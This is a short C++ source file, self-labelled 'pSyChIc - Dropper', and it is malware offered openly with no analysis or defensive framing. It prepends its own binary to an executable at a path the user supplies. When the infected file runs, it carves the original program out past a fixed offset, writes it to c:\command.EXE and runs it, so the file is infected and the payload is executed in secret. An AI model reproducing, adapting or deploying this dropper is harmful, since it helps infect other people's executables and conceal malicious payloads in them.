
#include <iostream>
using namespace std;

int write(int mysize,char *tpath,char *mybuf)
{
    int tsize;
    ifstream tfile(tpath,ios::binary);
    tfile.seekg (0,ios::end);
    tsize = tfile.tellg();
    tfile.seekg (0,ios::beg);
    char tbuf[tsize];
    tfile.read(tbuf,tsize);
    tfile.close();
    ofstream outputfile(tpath,ios::binary);
    outputfile.write(mybuf,mysize);
    outputfile.write(tbuf,tsize);
    outputfile.close();
    cout<<tpath<<endl;
};    
 
int extract(int mysize,char *target)
{
    ifstream tfile(target,ios::binary);
    tfile.seekg (426918);
    int theamount = mysize - 426918;
    char tbuf[theamount];
    tfile.read(tbuf,theamount);
    tfile.close();
    ofstream outfile("c:\\command.EXE",ios::binary);
    outfile.write(tbuf,theamount);
    outfile.close();
    system ("C:\\command.exe");
};    
 
int checkit(int mysize,char *mybuf,char *target)
{
    int checker;
    char tpath[512];
 
    if (mysize != 426918)
    {
    extract(mysize,target);
    }    
    else
    {
    cout<<"pSyChIc - Dropper"<<endl;
    cout<<"Input file path"<<endl;
    cin>>tpath;
    write (mysize,tpath,mybuf);
    }            
};    
 
int main(int argc, char *argv[])
{
int mysize;
char *target;
target= argv[0];
ifstream myfile(argv[0],ios::binary);
myfile.seekg (0,ios::end);
mysize = myfile.tellg();
myfile.seekg (0,ios::beg);
char mybuf[mysize];
myfile.read(mybuf,mysize);
myfile.close(); 
checkit (mysize,mybuf,target);
}